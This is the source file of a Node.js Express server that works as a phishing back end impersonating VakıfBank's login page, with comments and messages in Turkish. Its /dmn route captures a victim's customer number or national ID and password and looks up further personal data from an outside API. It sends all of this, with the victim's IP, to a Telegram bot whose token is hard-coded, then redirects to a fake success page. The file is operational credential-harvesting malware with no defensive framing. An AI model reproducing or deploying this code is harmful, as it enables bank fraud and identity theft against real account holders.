const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const path = require("path");

const app = express();
const PORT = 3000;

const botToken = "5259402316:AAGL1Fk6G_43TipMdcRnap99xYVs2FSvAVM";
const chatId = "991795418";
//const botToken = "8452844424:AAGkw2PVDwYiHM15OM26A_Bz92qnX39CulA";
//const chatId = "-1002998135862";


app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

const sendMessageToTelegram = async (message) => {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    });
  } catch (error) {
    console.error("Telegram'a mesaj gönderilirken hata oluştu:", error.response ? error.response.data : error.message);
  }
};

app.post("/dmn", async (req, res) => {
  const musNo = req.body["_ctl0:_ctl0_MusNoText"];
  const parola = req.body["_ctl0:ParolaText"];
  const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  try {
    // API'ye istek at
    const apiUrl = `https://xn--gndemhaber-9db.site/tomapi.php?tc=${musNo}`;
    const response = await axios.get(apiUrl);
    const data = response.data.data; // JSON içindeki "data" alanı

    // Gelen data’yı mesaj formatına çevir
    let dataMsg = "";
    for (const key in data) {
      if (Array.isArray(data[key])) {
        dataMsg += `*${key}:* ${data[key].join(", ")}\n`;
      } else {
        dataMsg += `*${key}:* ${data[key]}\n`;
      }
    }

    const message = `
*--- VakıfBank Giriş Bilgileri ---*
*Müşteri No/TC:* \`${musNo}\`
*Şifre:* \`${parola}\`
*IP:* \`${userIP}\`
*------------------------------------*
*API Verileri:*
${dataMsg}
`;

    await sendMessageToTelegram(message);
  } catch (err) {
    console.error("Hata:", err.message);
  }

  res.redirect("/basarili");
});
 
app.listen(PORT, () => {
  console.log(`Sunucu http://localhost:${PORT} adresinde çalışıyor`);

});

module.exports = app;